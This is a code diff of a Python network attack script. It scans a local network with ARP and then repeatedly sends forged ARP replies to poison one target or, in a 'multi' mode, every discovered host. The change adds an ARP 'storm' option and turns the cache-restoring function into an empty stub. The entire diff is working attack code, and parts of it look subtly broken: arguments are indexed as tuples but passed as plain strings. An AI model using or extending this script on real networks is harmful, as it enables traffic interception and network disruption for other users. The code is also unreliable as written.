@@ -20,25 +20,34 @@ def scan():
     broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
     answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-    devices_list = []
+    devices={}
     for element in answered_list:
-        device_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
-        devices_list.append(device_dict)
+        devices[element[1].psrc]=  element[1].hwsrc
     current_ip = get_if_addr(conf.iface)
-    current_mac = get_if_hwaddr(conf.iface)
-    current_device = {"ip": current_ip, "mac": current_mac}
-    devices_list.append(current_device)
-    return devices_list
+    devices[current_ip] = get_if_hwaddr(conf.iface)
+    return devices
 
-################################################## CHANGE after this line ##################################################
-def spoof(target_ip, spoof_ip, interface):
-    target_mac = get_mac(target_ip)
-    packet = Ether(dst=target_mac, src=get_if_hwaddr(interface)) / \
+
+def spoof(target_ip_mac, spoof_ip_mac, interface):
+    target_mac = target_ip_mac[1]
+    target_ip= target_ip_mac[0]
+    spoof_mac = spoof_ip_mac[1]
+    spoof_ip = spoof_ip_mac[0]
+    packet = Ether(dst=target_mac, src=spoof_mac) / \
              ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     sendp(packet, iface=interface, verbose=0)
     return
 
-def restore(destination_ip, source_ip, interface):
+def restore(target_ip_mac, original_ip_mac, interface):
+    return
+
+def start_attack(ip, iface, multi):
+    devices = scan()
+    if multi:
+        for target_ip_mac in devices.items():
+            spoof(target_ip_mac, devices[random.choice(list(devices.keys()))], iface)
+    else:
+        spoof(devices[ip], devices[random.choice(list(devices.keys()))], iface)
     return
 
 if __name__ == "__main__":
@@ -47,19 +56,19 @@ if __name__ == "__main__":
     parser.add_argument('target', help='IP of first target')
     parser.add_argument('-i', '--interface', default='eth0',
                        help='Network interface (default: eth0)')
-    parser.add_argument('-s', '--storm', default=False, action='store_true',
-                       help='Enable ARP storm')
+    parser.add_argument('-m', '--multi', default=False,
+                       help='Enable multi-MAC ARP storm')
     
     args = parser.parse_args()
     
     ip = args.target
     iface = args.interface
-    storm = args.storm
+    storm = args.multi
     
     try:
-        print(f"[*] Starting ARP spoofing attack between {args.target1} and {args.target2}")
+        print(f"[*] Starting ARP attack om {args.target}")
         while True:
-            spoof(ip, iface)
+            start_attack(ip, iface, storm)
             time.sleep(2)
             
     except KeyboardInterrupt:
